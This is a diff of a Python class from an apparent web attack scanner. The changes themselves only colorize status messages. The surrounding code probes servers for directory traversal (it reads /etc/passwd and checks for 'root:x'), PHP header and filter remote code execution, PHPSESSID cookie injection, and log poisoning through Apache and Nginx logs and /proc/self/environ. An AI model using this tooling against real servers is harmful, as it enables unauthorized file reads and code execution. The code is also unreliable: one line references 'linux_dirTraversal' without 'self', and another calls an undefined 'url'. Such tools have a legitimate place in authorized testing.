@@ -74,7 +74,7 @@ class Payload:
 			for n in self.poc:
 				compUrl = self.url + i + n
 				if self.verbosity > 1:
-					print(f'[*] Testing: {compUrl}')
+					print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
 				clean = self.hit(compUrl)
 				if 'root:x' in clean.lower():
 					print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
@@ -90,7 +90,7 @@ class Payload:
 		for header in self.phpHeaders:
 			compUrl = self.url + header
 			if self.verbosity > 1:
-				print(f'[*] Testing: {compUrl}')
+				print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
 			clean = self.hit(compUrl)
 			if 'uid=' in clean.lower():
 				print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl)
@@ -104,7 +104,7 @@ class Payload:
 		for path in self.filterPaths:
 			compUrl = self.url + self.filterBase + path
 			if self.verbosity > 1:
-				print(f'[*] Testing: {compUrl}')
+				print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
 			clean = self.hit(compUrl)
 			words = clean.split()
 			if len(words) > 0:
@@ -124,7 +124,7 @@ class Payload:
 	# Checks if the PHPSESSID cookie can be exploited
 	def cookieCheck(self):
 		if self.verbosity > 1:
-			print('[*] Testing: PHPSESSID cookie injection')
+			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: PHPSESSID cookie injection')
 		s = requests.Session()
 		session = s.get(self.url, headers=fetchUA())
 		cookies = session.cookies.get_dict()
@@ -149,11 +149,11 @@ class Payload:
 		headers = {"User-Agent": self.payload}
 		response = requests.get(self.url, headers=fetchUA())
 		if self.verbosity > 1:
-			print('[*] Testing: Log Poisoning based on server type.')
+			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: Log Poisoning based on server type.')
 		# checks the type of the server
 		if "apache" in response.headers['Server'].lower():
 			if self.verbosity > 1:
-				print('[*] Server Identified as Apache2')
+				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as Apache2')
 			# Apache logs
 			logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ")]
 			for d_path in self.linux_dirTraversal:
@@ -170,7 +170,7 @@ class Payload:
 		elif "nginx" in response.headers['Server'].lower():
 			# Nginx logs
 			if self.verbosity > 1:
-				print('[*] Server Identified as NGINX')
+				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as NGINX')
 			log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log")]
 			for d_path in linux_dirTraversal:
 				for l_path in log:
@@ -183,5 +183,5 @@ class Payload:
 						if self.verbosity > 0:
 							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')	
 		else:
-			print("[-] A directory traversal attack is VALID but the server type " + url.getheader('Server') + " is not supported!!!")
+			print(colored('[-]', 'red', attrs=['bold']) + " A directory traversal attack is VALID but the server type " + url.getheader('Server') + " is not supported!!!")
 
